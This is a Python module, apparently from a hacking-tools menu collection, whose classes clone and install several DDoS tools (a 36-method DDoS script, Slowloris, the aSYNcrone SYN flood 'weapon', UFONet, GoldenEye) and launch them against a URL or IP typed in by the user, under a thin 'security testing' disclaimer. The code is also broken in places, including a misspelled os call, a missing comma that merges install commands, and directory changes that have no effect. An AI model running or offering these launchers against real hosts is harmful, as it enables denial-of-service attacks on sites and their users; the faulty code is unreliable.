# coding=utf-8

import os
import subprocess

from core import HackingTool
from core import HackingToolsCollection


class ddos(HackingTool):
    TITLE = "ddos"
    DESCRIPTION = (
        "Best DDos attack script with 36 methods ."
        "Ddos attacks\n\b"
        "for SECURITY TETING PURPOSE ONLY"
    )

    INSTALL_COMMANDS = [
        "git clone https://github.com/the-deepnet/ddos.git",
        "cd ddos;sudo pip3 install -r requirements.txt",
    ]
    PROJECT_URL = "https://github.com/the-deepnet/ddos.git"

    def run(self):
        method = input("enter method : ")
        url = input("enter url : ")
        threads = input("enter threads : ")
        proxylist = input("enter proxylist : ")
        multiple = input("enter multiple : ")
        timer = input("enter timer : ")
        os.system("cd ddos;")
        subprocess.run(
            [
                "sudo",
                "python3 ddos",
                method,
                url,
                "socks_type5.4.1",
                threads,
                proxylist,
                multiple,
                timer,
            ]
        )


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    DESCRIPTION = (
        "Slowloris is basically an http denial of service attack"
        "it send lost of http request"
    )
    INSTALL_COMMANDS = ["sudo pip3 install slowloris"]

    def run(self):
        target_site = input("enter site : ")
        subprocess.run(["slowloris", target_site])


class Asyncorne(HackingTool):
    TITLE = "Asyncorne | multifunction syn flood ddos weapon"
    DESCRIPTION = (
        "asyncrone is a c language based, multifunction syn flood"
        "ddos weapon.\nDisable the destination system by sending a "
        "syn packet intensively to the destination"
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/fatih4842/aSYNcrone.git",
        "cd aSYNcrone;sudo gcc aSYNcrone.c -o aSYNcrone -lpthread",
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        source_port = input("enter source port : ")
        target_ip = input("enter target ip : ")
        target_port = input("enter target port : ")
        os.sustem("cd aSYNcrone;")
        subprocess.run(
            ["sudo", "./aSYNcrone", source_port, target_ip, target_port, 1000]
        )


class UFONet(HackingTool):
    TITLE = "UFONet"
    DESCRIPTION = (
        "UFONet is a free software, p2p and cryptographic "
        "-distruptive \n toolkit-that allows to perform DoS and "
        "DDo attkcs\n\b "
        "for SECURITY TETING PURPOSE ONLY"
    )
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/epsylon/ufonet.git"
        "cd ufonet;python3 setup.py  install;sudo pip3 install GeoIP;sudo install pygeoip;sudo pip3 install requests;sudo pip3 install pycrypto;sudo pip3 install pycurl;sudo pip3 install whois;sudo pip3 install scapy-python3"
    ]
    RUN_COMMANDS = ["sudo python3 ufonet --gui"]
    PROJECT_URL = "https://github.com/epsylon/ufonet"


class GoldenEye(HackingTool):
    TITLE = "GoldenEye"
    DESCRIPTION = (
        "GoldenEye is an python3 app for SECURITY TESTING PURPOSES ONLY!\n"
        "GoldenEye is a HTTP DoS Test Tool."
    )
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/jseidl/GoldenEye.git;"
        "chmod -R 755 GoldenEye"
    ]
    PROJECT_URL = "https://github.com/jseidl/GoldenEye"

    def run(self):
        os.system("cd GoldenEye; sudo ./goldeneye.py")
        print(
            "\033[96m Go to directory \n " "[*] Usage: ./goldeneye.py <url> [OPTIONS]"
        )


class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack tools"
    TOOLS = [SlowLoris(), Asyncorne(), UFONet(), GoldenEye()]
